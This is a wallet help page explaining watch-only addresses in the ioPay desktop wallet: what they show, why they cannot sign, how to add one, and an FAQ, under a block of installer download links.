![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# Watch-Only Addresses in ioPay Wallet

A watch-only address lets you **see an account without holding its key**. You add the address, the wallet reads its balance and history from the chain, and nothing in the app can sign for it.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

It is the right tool for monitoring an account that lives somewhere safer - a hardware wallet, an offline machine, a treasury someone else controls - and the wrong tool for anything you intend to spend from.

## What it does

- Shows the balance and transaction history of an address you name.
- Lets you check a staking position, a device registration or an incoming transfer without exposing a key.
- Keeps the key out of the machine entirely, which is the point.

## What it cannot do

- **Sign anything.** No sends, no staking, no bridge, no device registration.
- **Prove ownership.** Watching an address is not custody and not proof.
- **Recover an account.** There is no key here; if the key is lost elsewhere, a watch-only entry cannot help.

If you need to sign, you need the key imported or a hardware device connected (F028) - [connecting a Ledger device](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/connecting-a-ledger-device-to-iopay-wallet.md) is the signing counterpart to this page.

## Adding one

1. **Open the account section** and choose to add a watch-only address.
2. **Paste the address** in either form - the `io1...` native address or the `0x...` EVM address of the same account (F019).
3. **Confirm the balance matches** what you expect from the source you took the address from.

Both forms show the same account, so add whichever you have. There is no need to add both.

## When it is worth doing

**Monitoring a hardware-backed account without connecting the device.** You get the position view without the device on the desk.

**Watching an address that receives regularly** - an exchange deposit address you control, or a device payout address.

**Checking an old account you have not restored yet.** Look before you import; if the address is right, the import will land in the right place.

## When it is not

**As a substitute for a backup.** A watch-only entry is not recovery.

**As a way to "secure" an account you already hold in the app.** The key is still there; watching a second copy changes nothing.

**For anything requiring a signature.** If a flow needs a signature, watch-only cannot complete it, and that is the feature working.

## The safety note

A watch-only address is public information - any address is. Adding one never asks for a phrase, a key or a keystore password, and any screen that does is not a watch-only flow.

That cuts both ways: because addresses are public, someone else watching yours is not a compromise. What matters is the key, and the key is not here.

## Related

- [Receiving IOTX](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/receiving-iotx-in-iopay-wallet.md) - what to share, and which format.
- [io1 and 0x addresses](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/io1-and-0x-addresses-in-iopay.md) - why one account has two.
- [Importing a private key](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/import-an-iotex-private-key-into-iopay.md) - when you need to sign, not just watch.

## FAQ

**How do I watch an address without importing its key?**
Add it as a watch-only address; the wallet reads the chain and shows the balance without any signing capability.

**Can a watch-only wallet send funds?**
No. It cannot sign.

**Can I turn a watch-only entry into a full account?**
Only by importing the key material or connecting the hardware device that holds it.

**Does adding a watch-only address expose anything?**
No. Addresses are public; the entry holds no secret.

**Will it show staking positions?**
It shows what the chain reports for that address, including positions, but it cannot stake or unstake.

## What a watch-only entry shows in a staking wallet

Positions come through, because they are chain state: a bucket's amount, its validator, its start and its end, and the rewards accrued against it all render for a watched address, and none of them can be moved from here. What you cannot do is anything that needs a signature - delegate, unstake, withdraw, vote, bridge or register a device. The view is complete; the authority is zero.

That makes a watch-only entry a good second screen. Keep the signing device in a drawer and the watched entry on the desktop you use every day: you can see whether rewards are accruing and when a bucket's lock ends without the device plugged in, and connect it only when you mean to act.

## The two addresses, and which to paste

Every account has an `io1...` native address and an `0x...` EVM address, and they are the same account (F019, F031). Pasting either form when you add a watch-only entry lands on the same position. Adding the same account twice does not give you a second view of anything, so pick one form and stay with it. Take whichever form your source gave you: an exchange withdrawal receipt usually shows one, a block explorer shows both.

## What it is not

A watch-only entry is not a half-configured account waiting for a final step. There is no step: the entry has no key by design, and no menu turns it into one. If the key material later arrives, the signing route is an import or a connected device, and the watched entry stays a read-only view of the same address - useful to keep, harmless to remove.

The distinction is worth holding on to when advice online blurs it. "Add your address to the wallet" describes both a watch-only entry and a full import, and only one of them can lose you money if you get it wrong.


---

*Watch-only mode is part of the build's security set (F028); address formats follow IoTeX documentation.*
